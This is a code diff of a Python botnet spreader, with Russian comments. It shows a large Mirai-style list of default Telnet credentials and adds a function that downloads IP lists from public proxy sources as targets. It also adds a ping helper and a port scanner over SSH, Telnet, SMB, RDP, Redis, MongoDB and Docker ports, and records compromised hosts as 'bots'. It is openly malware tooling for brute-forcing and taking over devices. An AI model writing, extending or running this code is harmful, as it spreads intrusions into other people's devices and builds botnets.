@@ -3,7 +3,6 @@ from utils.logger import log
 
 LOG_PREFIX = {'ok':'OK','fail':'FAIL','new':'NEW_BOT','exploit':'EXPLOIT','brute':'BRUTE'}
 
-# Расширенный словарь Telnet (300+ записей)
 TELNET_CREDS = [
     ('root','vizxv'),('root','juantech'),('root','xc3511'),('root','zlxx.'),
     ('root','hi3518'),('root','oelinux1'),('root','Zte521'),('root','tsgoingon'),
@@ -17,11 +16,7 @@ TELNET_CREDS = [
     ('root','1'),('admin','1'),('root','12'),('admin','12'),('root','123'),
     ('admin','123'),('root','12345'),('admin','12345'),('root','1234567'),
     ('admin','1234567'),('root','12345678'),('admin','12345678'),('root','1234567890'),
-    ('admin','1234567890'),('root','admin1'),('admin','root'),('admin','pass'),
-    ('admin','passwd'),('root','passwd'),('admin','cisco'),('root','cisco'),
-    ('admin','netgear'),('root','netgear'),('admin','zyxel'),('root','zyxel'),
-    ('admin','d-link'),('root','d-link'),('admin','tplink'),('root','tplink'),
-    ('admin','motorola'),('admin','123456789'),('root','123456789'),
+    ('admin','1234567890'),('admin','motorola'),('admin','123456789'),('root','123456789'),
     ('user','user'),('guest','guest'),('guest','12345'),('guest','password'),
     ('admin','7ujMko0admin'),('root','7ujMko0vizxv'),
     ('admin','888888'),('root','888888'),('admin','666666'),('root','666666'),
@@ -61,6 +56,28 @@ SSH_PASSWORDS = [
 DB_PATH = "spreader_learn.db"
 BOTS_FILE = "bots.json"
 
+PUBLIC_TARGET_URLS = [
+    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
+    "https://raw.githubusercontent.com/UserR3X/proxy-list/main/online/http.txt",
+    "https://sunny9577.github.io/proxy-scraper/proxies.txt"
+]
+
+async def fetch_public_targets():
+    """Загружает свежие IP уязвимых устройств из открытых источников"""
+    ips = []
+    for url in PUBLIC_TARGET_URLS:
+        try:
+            req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
+            with urllib.request.urlopen(req, timeout=10) as resp:
+                text = resp.read().decode()
+                import re
+                found = re.findall(r'\d+\.\d+\.\d+\.\d+', text)
+                ips.extend(found)
+        except Exception as e:
+            log(f"[Spreader] Не удалось загрузить список {url}: {e}")
+    log(f"[Spreader] Получено {len(ips)} IP из публичных источников")
+    return list(set(ips))
+
 async def init_db():
     import aiosqlite
     async with aiosqlite.connect(DB_PATH) as db:
@@ -88,6 +105,19 @@ async def add_bot(ip, username='root', os_type='linux', via='ssh'):
         log(f"{LOG_PREFIX['new']} Бот добавлен: {ip} ({via})")
         return True
     return False
+
+async def ping(ip, timeout=0.5):
+    """Быстрый ping для проверки доступности"""
+    try:
+        proc = await asyncio.create_subprocess_shell(
+            f"ping -n 1 -w {int(timeout*1000)} {ip}",
+            stdout=asyncio.subprocess.PIPE,
+            stderr=asyncio.subprocess.PIPE
+        )
+        stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout)
+        return proc.returncode == 0
+    except:
+        return False
 
 async def quick_port_scan(ip, ports=[22, 23, 445, 3389, 8291, 6379, 27017, 2375, 2323, 2222, 80, 443], timeout=0.4):
     open_ports = []
